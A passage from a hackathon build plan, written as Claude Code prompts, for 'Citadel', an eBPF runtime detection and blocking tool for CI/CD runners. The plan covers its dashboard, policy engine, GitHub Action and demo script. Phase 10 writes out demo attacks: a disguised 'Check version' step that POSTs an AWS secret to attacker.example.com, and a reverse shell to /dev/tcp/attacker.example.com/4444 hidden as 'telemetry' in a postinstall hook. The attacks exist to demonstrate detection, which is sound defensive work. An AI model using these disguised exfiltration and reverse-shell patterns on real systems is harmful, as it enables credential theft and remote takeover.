- `components/navbar.tsx` — top nav with "Citadel" wordmark (use a shield icon from lucide), nav links to /runs, /detections, /policies, and a backend status dot (green/red based on `/healthz` poll every 5s)  
- `app/layout.tsx` — wraps in navbar, applies Inter font (Google) for UI and JetBrains Mono for code  
- `app/page.tsx` — redirects to `/runs`  
- Dark theme by default (slate-950 background, slate-100 text). Accent color: cyan-500.

**Prompt 7.2 — Runs list** Create `app/runs/page.tsx`:

- Server component, fetches `/api/runs`  
- Page header: "Workflow Runs" \+ a refresh button  
- Table columns: Repo · Workflow · Run \# · SHA (short, mono) · Mode (badge: AUDIT yellow, BLOCK red) · Events (small icons: 🌐 network 🧬 process 📝 file with counts) · Detections (badge: count, color by max severity) · Started (relative time, "2m ago")  
- Each row links to `/runs/[id]`  
- Empty state: subtle SVG of a shield outline \+ "No runs yet. Add citadel-setup to your workflow."

**Prompt 7.3 — Run detail page** Create `app/runs/[id]/page.tsx`:

- Header card: repo, workflow \+ run \#, SHA \+ commit message (use "—" if not available), mode badge, total events, total detections  
- Below: a 2-column layout  
  - **Left (70%)**: tabs — "Network" "Processes" "Files" "Timeline"  
    - Network tab: table of network events: timestamp, hostname (or IP), port, process, step, action (allowed/blocked with badge). Filter input.  
    - Processes tab: collapsible process tree (use nested `<details>` for simplicity if react-flow is too much). Show comm, args, ancestry inline.  
    - Files tab: table of file writes with path, flags, process, timestamp. Highlight rows under `/home/runner/work` in cyan.  
    - Timeline tab: chronological list of ALL events, grouped by step, with icons by type.  
  - **Right (30%)**: "Detections" sidebar — list cards: severity badge (color-coded), rule name, message, link to the offending event row. Sticky positioning.  
- Use Tailwind. Polished spacing, mono font for all code-like values.

**Prompt 7.4 — Process tree (best-effort)** If time permits in Phase 7, add a real tree view component `components/process-tree.tsx`:

- Recursive component rendering nested processes  
- Each node: small card with comm (bold) \+ truncated args \+ PID badge  
- Click to expand/collapse  
- If a process has a detection on it, red border  
- Fetches `/api/runs/[id]/process-tree`

If skipping for time, fall back to a flat indented list — still works.

**Prompt 7.5 — Policy editor** Create `app/policies/page.tsx`:

- List existing policies (name, scope, mode)  
- "New policy" button → modal with form: name, repo, workflow, mode (audit/block), allowlist (textarea, one domain per line), severity-action map (table)  
- Save → POST to backend  
- Also `app/policies/[id]/page.tsx` for editing  
- YAML preview pane next to the form (live update)

**Acceptance:** All pages render with real data from the backend. Drilling into a run shows events tagged by step.

---

### Phase 8 — Policy Engine \+ Block Mode (2h 30m)

**Problem:** Audit is informational. Real product value is *enforcement* — actually blocking the bad thing as it happens.

**Sub-problems:**

- 8.1 Agent loads policy from backend at startup \+ on reload signal  
- 8.2 In-kernel blocking via cgroup\_skb (or fallback: userspace iptables drops)  
- 8.3 Process killing via `bpf_send_signal` or userspace `kill()`  
- 8.4 Policy precedence resolution (workflow \> repo \> default)  
- 8.5 UI affordances for block mode

**Tech:** eBPF `cgroup_skb` programs, `BPF_PROG_TYPE_CGROUP_SKB`, Go `os.Kill` fallback

**Claude Code prompts:**

**Prompt 8.1 — Policy loader in agent** Create `/agent/internal/policy/policy.go`:

- `type Policy struct { Name string; Mode string; AllowedDomains []string; AllowedIPs []string; DetectionActions map[string]string }`  
- `LoadFromBackend(ctx, backendURL, repo, workflow) (*Policy, error)` — calls `/api/policies/applicable?repo=...&workflow=...`. Falls back to permissive default on error.  
- `(p *Policy) ShouldBlockDomain(hostname string) bool` — matches against allowlist with glob (`*.foo.com` works). Returns true if mode=block AND hostname not in allowlist.  
- `(p *Policy) ShouldKillProcess(rule string) bool` — looks up `DetectionActions[rule]` — if "kill" or "fail", returns true.  
- Reload signal: agent listens on SIGHUP, re-fetches policy.

**Prompt 8.2 — cgroup\_skb blocking program** Create `/agent/bpf/block.bpf.c`:

- `SEC("cgroup_skb/egress")` program named `cg_egress_filter`  
- Reads packet IP header, extracts dst IP  
- Looks up dst IP in a `BPF_MAP_TYPE_HASH` map `blocked_ips` (key=u32 ip, value=u8)  
- If found, returns 0 (drop). Else returns 1 (allow).  
- License: GPL

Go side `/agent/internal/probes/block/block.go`:

- bpf2go for `BlockProgram`  
- `Load(cgroupPath string) error` — loads program, attaches via `link.AttachCgroup` to the runner's cgroup (`/sys/fs/cgroup` root for hackathon simplicity)  
- `Block(ip net.IP) error` — adds to `blocked_ips` map  
- `Unblock(ip net.IP) error` — removes from map  
- `Close()`

In agent main: when mode=block AND a network event matches a blocked domain, resolve hostname → IP (already in dns cache), add to map. Re-add on every event since DNS may give new IPs.

**Fallback if cgroup\_skb is fighting you (2-hour ceiling):** comment out the cgroup\_skb code and instead shell out to `iptables -A OUTPUT -d <ip> -j DROP` from Go. Same effect, less impressive.

**Prompt 8.3 — Process killing** Two paths — pick one:

**Path A (impressive):** In `/agent/bpf/block.bpf.c`, add a `BPF_MAP_TYPE_HASH` of bad PIDs. Add a kprobe on `do_exit` that's a no-op (just for completeness). For killing, use a Go-side approach: when a detection rule fires (we can re-fetch detections from backend every 2s), if the action is "kill", call `syscall.Kill(pid, SIGKILL)` from userspace.

**Path B (simpler):** Skip in-kernel kill entirely. The Go agent polls `/api/detections?since=...` every 2s; for each detection with action=kill, sends SIGKILL to the pid (looked up from the detection's event\_id → event → process pid). Document this as "userspace enforcement" in the README.

Pick Path B for time. Implement in `/agent/internal/enforcer/enforcer.go`.

**Prompt 8.4 — Backend policy resolution** Update backend `GET /api/policies/applicable?repo=X&workflow=Y`:

- Match precedence: exact (repo, workflow) \> repo only \> "\*" wildcard \> hardcoded permissive default  
- Return as JSON with full policy struct

**Prompt 8.5 — Dashboard block UX** Update `/dashboard`:

- On runs list, "Mode" column already shows AUDIT/BLOCK — add a count of blocked events when mode=block  
- On run detail, if blocked\_count \> 0: red banner "🛡️ Citadel blocked N outbound connections in this run"  
- Network tab: rows with action=blocked have red left border, BLOCKED badge  
- Add a "Generate Policy" button on the Network tab → calls a new backend endpoint `POST /api/runs/:id/generate-policy` that creates a draft policy from this run's distinct domains; redirects to the policy editor pre-filled

**Acceptance:** With policy in block mode, run an attack workflow that calls `attacker.example.com` → connection drops (curl gets "Connection refused" or hangs) → dashboard shows blocked event with red styling.

---

### Phase 9 — GitHub Action \+ Docker Packaging (1h 30m)

**Problem:** Make Citadel trivially installable into any workflow. One step in YAML.

**Sub-problems:**

- 9.1 Composite GitHub Action that pulls the Docker image and starts the agent  
- 9.2 Pre-job snapshot of workspace for tampering detection  
- 9.3 Cleanup post-job (graceful agent shutdown, iptables cleanup)  
- 9.4 Publish Docker image to GHCR

**Tech:** GitHub Composite Action YAML, Docker, bash

**Claude Code prompts:**

**Prompt 9.1 — Composite action** Create `/action/action.yml`:

- Name: `citadel-setup`  
- Description: "Citadel runtime EDR for CI/CD"  
- Inputs:  
  - `mode` (audit/block, default: audit)  
  - `backend-url` (required)  
  - `image-tag` (default: latest)  
  - `watch-path` (default: `$GITHUB_WORKSPACE`)  
- Composite run steps:  
  1. Write `GITHUB_*` env vars to `/tmp/citadel-meta.json`  
  2. Create `/tmp/citadel-current-step` (empty)  
  3. Install helper: write a small shell script `/usr/local/bin/citadel-step` to the runner that takes one arg and writes it to `/tmp/citadel-current-step`  
  4. Take pre-build snapshot: `docker run --rm -v $GITHUB_WORKSPACE:/workspace -v /tmp:/host-tmp ghcr.io/.../citadel-agent:$IMAGE_TAG snapshot --path /workspace --out /host-tmp/citadel-baseline.json`  
  5. Start agent in background: `docker run -d --name citadel --privileged --pid=host --network=host -v /sys/fs/cgroup:/sys/fs/cgroup -v /tmp:/tmp ghcr.io/.../citadel-agent:$IMAGE_TAG run --mode $MODE --backend-url $BACKEND_URL --meta-file /tmp/citadel-meta.json --watch-path $WATCH_PATH`  
  6. Wait 3s for agent to attach probes  
- Post-step (always runs): `docker run --rm -v $GITHUB_WORKSPACE:/workspace -v /tmp:/host-tmp ... diff --before /host-tmp/citadel-baseline.json --after-path /workspace --backend-url $BACKEND_URL`; then `docker stop citadel; docker rm citadel`

**Prompt 9.2 — Push images to GHCR** Create `/.github/workflows/build-images.yml`:

- Triggers on push to main, paths `/agent/**`, `/backend/**`, `/detector/**`, `/dashboard/**`  
- Builds and pushes each Docker image to GHCR with tags `latest` and `${{ github.sha }}`  
- Uses `docker/build-push-action@v5`  
- Requires `packages: write` permission

**Prompt 9.3 — Local-only fallback** For the hackathon demo, you may not want to depend on GHCR. Add a `make local-images` target that builds all four images and tags them locally as `citadel-agent:dev`, `citadel-backend:dev`, etc.

Update the composite action to support an `image-tag: dev` mode that skips the docker pull and assumes local images are present. Document this in `/docs/local-demo.md`.

**Acceptance:** Push the action to a public repo. Use it in `victim-ci.yml` as the first step. Workflow runs cleanly, agent attaches, events flow to backend.

---

### Phase 10 — Three Attack Demos \+ Polish (3h)

**Problem:** A working product means nothing without a compelling demo. We need three different attacks, each hitting one of our three goals, each visible in the dashboard.

**Sub-problems:**

- 10.1 Attack 1 — Credential exfiltration (Goal: Prevent Exfiltration)  
- 10.2 Attack 2 — Reverse shell from dep (Goal: Anomaly Detection)  
- 10.3 Attack 3 — Source code tampering (Goal: Detect Tampering)  
- 10.4 Polish (loading, empty states, demo reset)  
- 10.5 Demo script \+ backup recording

**Tech:** YAML, bash, a lot of caffeine

**Claude Code prompts:**

**Prompt 10.1 — Attack 1: Exfil** Create `/examples/attacks/exfil/action.yml`:

- Composite action `definitely-not-malicious`  
- In its run step (looks innocent: "Check version"): `curl -s -X POST -d "$AWS_SECRET_ACCESS_KEY" https://attacker.example.com/exfil > /dev/null || true`  
- Always exits 0 (stealthy)

Create `/examples/attack-1-exfil.yml`:

- Self-hosted runner  
- Env: `AWS_SECRET_ACCESS_KEY: AKIA-FAKE-DEMO-123456`  
- Steps: setup → citadel-setup (audit, then re-run with block) → checkout → use `./examples/attacks/exfil` → test

Note in README: replace `attacker.example.com` with a webhook.site URL or a domain that resolves to a VM you control. Add to runner's `/etc/hosts` if needed.

**Prompt 10.2 — Attack 2: Reverse shell** Create `/examples/attacks/revshell/index.js`:

- A Node.js script that does:  
    
  require('child\_process').spawn('sh', \['-c', 'sh \-i \>& /dev/tcp/attacker.example.com/4444 0\>&1'\], {detached: true})  
    
- Comment it as "telemetry phone-home" to look benign

Create `/examples/attack-2-revshell.yml`:

- Steps: setup → citadel-setup → checkout → install (npm install brings in fake malicious dep) → npm run start (triggers the spawn)  
- Add a `package.json` whose `postinstall` script runs the malicious code (simulating compromised dep)

The detector's `suspicious_shell_spawn` and `possible_reverse_shell` rules should fire. Severity: critical.

**Prompt 10.3 — Attack 3: Source tampering** Create `/examples/attacks/tamper/action.yml`:

- Composite action that appends to a source file: `echo "// SECRET BACKDOOR - exfil to attacker.example.com" >> $GITHUB_WORKSPACE/src/index.js`

Create `/examples/attack-3-tamper.yml`:

- Steps: setup → citadel-setup (audit) → checkout → use `./examples/attacks/tamper` → npm test

Citadel snapshot diff at end should catch the modified file. Detector's `source_modified_after_checkout` rule should fire.

**Prompt 10.4 — Polish pass** Polish pass on dashboard:

- Loading skeletons on all pages  
- Empty states with friendly copy and inline SVG (shield)  
- Inter \+ JetBrains Mono fonts properly loaded  
- Severity color palette: info=slate, low=blue, medium=amber, high=orange, critical=red — applied consistently to all badges  
- Smooth fade-in animations on event rows (use Tailwind `animate-in fade-in duration-300`)  
- On run detail, the detections sidebar should auto-scroll-to and highlight the corresponding event when you click a detection  
- Page titles set per route

**Prompt 10.5 — Demo script \+ reset script** Create `/docs/DEMO.md` — a tightly-scripted 5-minute walkthrough:

- Setup state: clean SQLite, no leftover Docker containers, agent stopped  
- Beat-by-beat narration with exact commands, browser tabs, and what the audience should see  
- Three attack demos in sequence, each \~90 seconds  
- Fallback strategy for each failure point

Create `make demo-reset`:

- `docker stop citadel || true; docker rm citadel || true`  
- `rm -f backend/citadel.db detector/data/baseline.json detector/data/state.json`  
- `sudo iptables -t nat -F OUTPUT` (clear any rules)  
- `sudo iptables -F OUTPUT`  
- `rm -f /tmp/citadel-*`  
- `make docker-up`  
- Print "Ready. Demo your magic."

**Acceptance:** All three attacks work end-to-end. Demo runs cleanly in under 5 minutes. Recording captured.

---

## Part 3 — Live Demo Script

**0:00 — Setup** (15s)

"CI/CD runners are the most powerful, least monitored part of modern software. They have your secrets, your source, your deploys — and you have almost zero visibility into what they do at runtime. Citadel changes that. eBPF-based EDR running inside every job."

**0:15 — Attack 1: Exfiltration** (90s)

- Show `attack-1-exfil.yml` — point at the innocent-looking `definitely-not-malicious` step  
- Audit run → workflow succeeds → webhook.site shows the leaked key  
- Dashboard → click the run → Network tab → point: `attacker.example.com:443` from process `curl` in step `definitely-not-malicious`  
- Show the process tree on the Processes tab: bash → action runner → curl  
- Click "Generate Policy" → policy editor opens with the legit allowlist  
- Switch mode to BLOCK, save, re-run  
- Workflow still runs, but: webhook.site shows NO new event; dashboard shows red banner "1 connection blocked"

**1:45 — Attack 2: Reverse Shell** (75s)

- Show `attack-2-revshell.yml` — "compromised npm dependency with a postinstall script"  
- Trigger run → workflow appears to succeed  
- Dashboard → red critical detection in sidebar: "possible\_reverse\_shell"  
- Click it → highlights the offending exec event: `sh -c "sh -i >& /dev/tcp/.../4444 ..."`  
- Show process tree: npm → node → sh (highlighted red)  
- "We caught this not by signature but by behavior — a build tool spawning an interactive shell while making outbound TCP. That's the EDR pattern."

**3:00 — Attack 3: Tampering** (75s)

- Show `attack-3-tamper.yml`  
- Trigger run → dashboard → Files tab → see `src/index.js` modified, process=bash, timestamp AFTER checkout, BEFORE test  
- Detection sidebar: "source\_modified\_after\_checkout"  
- "Citadel takes a SHA256 snapshot right after checkout and re-checks at the end. Any drift gets flagged. This catches the entire class of build-time backdoor injection."

**4:15 — Wrap** (30s)

"Three attacks, three goals, one platform. Built on eBPF for kernel-level visibility, with a Python detector for rules you can extend, and a one-line GitHub Action to install. That's Citadel."

---

## Part 4 — Cut List (check every 4 hours)

| If at hour | And missing... | Cut |
| :---- | :---- | :---- |
| 6 | eBPF \#1 not working | Fall back to a userspace DNS proxy \+ iptables. Lose "eBPF" buzzword but still demo-able. |
| 9 | eBPF \#2 not working | Skip process probe entirely. Reverse-shell detection becomes audit-only via /proc polling. |
| 11 | eBPF \#3 not working | Skip file probe. Tampering becomes "snapshot diff only" (still works, less impressive). |
| 14 | Detector incomplete | Hardcode 2 detection rules instead of 5\. Skip baseline. |
| 18 | Dashboard polish missing | Use raw `<table>` styling. Judges care about content over polish. |
| 20 | Block mode not working | Demo audit-only. Frame block mode as "shipped next sprint." |
| 22 | Two attacks not working | Pick the one that works most reliably. Polish that one demo to perfection. |

**The minimum viable demo:** eBPF network probe \+ dashboard showing tagged events \+ one working attack (exfil) caught in audit mode. Everything else is upside.

---

## Part 5 — Common Pitfalls (read before starting)

1. **Kernel version.** Need ≥ 5.15 for ringbuf and cgroup\_skb. `uname -r` to verify. If on 5.4 or older, you'll waste hours fighting BPF features.  
     
2. **vmlinux.h.** Generate it once with `bpftool btf dump file /sys/kernel/btf/vmlinux format c > bpf/vmlinux.h` and commit it. Don't regenerate per-build.  
     
3. **bpf2go and Go modules.** `bpf2go` runs at `go generate` time. Don't forget `//go:generate` directives. Add `make generate` that runs `go generate ./...` first.  
     
4. **`--privileged` \+ `--pid=host`.** The agent container needs both. Add `--network=host` too if your DNS resolution is weird in the container.  
     
5. **systemd-resolved.** Disable it on the runner VM (`sudo systemctl disable --now systemd-resolved`) or you'll fight DNS visibility forever.  
     
6. **Self-hosted runner labels.** Workflows need `runs-on: [self-hosted, linux, citadel-runner]`. Verify your runner was registered with that label.  
     
7. **cgroup v2.** Most modern systems use cgroup v2 (single hierarchy at `/sys/fs/cgroup`). Your cgroup\_skb attach point is the root of that. Test: `mount | grep cgroup2` should show one entry.  
     
8. **Webhook.site rate limits.** Get a URL, save it as a variable. If you hit limits, switch to `nc -lk 4444` on a cheap VPS.  
     
9. **Time check at hour 8\.** If you haven't finished Phase 3 (file probe) by hour 8, you will not finish all eBPF probes. Cut Phase 3, fall back to Go fsnotify for file events.  
     
10. **Record the demo at hour 21\.** Always. Live demos die in front of judges. The recorded backup means you're never trapped.  
      
11. **Python detector polling delay.** Default 2s poll \= up to 2s delay between event and detection. For live demos, drop to 500ms. Don't forget to bump it back if you're worried about backend load.  
      
12. **eBPF verifier rejections.** When the verifier rejects your program, the error is usually about unbounded loops, unchecked pointer derefs, or stack size. Add bounds checks. Use `bpf_probe_read_kernel_str` not `_user_str` for kernel pointers. Search the error string verbatim — someone hit it before on GitHub.

---

## Appendix — Useful one-liners

\# Check kernel \+ BPF features

uname \-r

zgrep CONFIG\_BPF /proc/config.gz 2\>/dev/null || zcat /boot/config-$(uname \-r) | grep BPF

\# Re-generate vmlinux.h

sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c \> agent/bpf/vmlinux.h

\# Watch eBPF tracepoint events directly (debugging)

sudo cat /sys/kernel/debug/tracing/trace\_pipe

\# List loaded BPF programs

sudo bpftool prog list

\# Force-detach a stuck cgroup program

sudo bpftool cgroup detach /sys/fs/cgroup egress id \<prog\_id\>

\# Tail backend events

watch \-n 1 'sqlite3 backend/citadel.db "SELECT timestamp, type, json\_extract(payload, \\"$.network.hostname\\") FROM events ORDER BY id DESC LIMIT 10"'

\# Reset between demos

make demo-reset

\# Trigger a workflow from CLI

gh workflow run attack-1-exfil.yml

---

## Appendix B — File checklist

By end of hour 24, you should have:

citadel/

├── README.md

├── Makefile

├── docker-compose.yml

├── agent/

│   ├── Dockerfile

│   ├── Makefile

│   ├── bpf/

│   │   ├── vmlinux.h

│   │   ├── net.bpf.c

│   │   ├── proc.bpf.c

│   │   ├── file.bpf.c

│   │   └── block.bpf.c

│   ├── cmd/agent/main.go

│   └── internal/

│       ├── probes/{net,proc,file,block}/

│       ├── dns/cache.go

│       ├── proctree/tree.go

│       ├── integrity/baseline.go

│       ├── workflow/meta.go

│       ├── policy/policy.go

│       ├── backend/client.go

│       ├── events/event.go

│       └── enforcer/enforcer.go

├── backend/

│   ├── Dockerfile

│   ├── cmd/backend/main.go

│   └── internal/{db,api}/

├── detector/

│   ├── Dockerfile

│   ├── pyproject.toml

│   └── app/

│       ├── {main,worker,baseline,client,models}.py

│       └── rules/{new\_domain,reverse\_shell,source\_tamper,suspicious\_exec,token\_in\_payload}.py

├── dashboard/

│   ├── Dockerfile

│   └── app/{runs,detections,policies}/...

├── action/action.yml

├── examples/

│   ├── victim-ci.yml

│   ├── attack-1-exfil.yml

│   ├── attack-2-revshell.yml

│   ├── attack-3-tamper.yml

│   ├── attacks/{exfil,revshell,tamper}/

│   ├── package.json

│   ├── index.js

│   └── test.js

└── docs/

    ├── DEMO.md

    ├── architecture.md

    └── local-demo.md

---

**One final note on vibe-coding with Claude Code:** each prompt above is *file-scoped* on purpose. Resist the urge to ask "build the whole agent." Break it down by file or by function. When a prompt fails (and some will — eBPF verifier errors, BPF map type mismatches), feed the exact error back to Claude Code and ask it to fix that specific issue. Don't restart from scratch.

Build the demo backwards. Three attacks. Three goals. One Citadel. 🏛️  
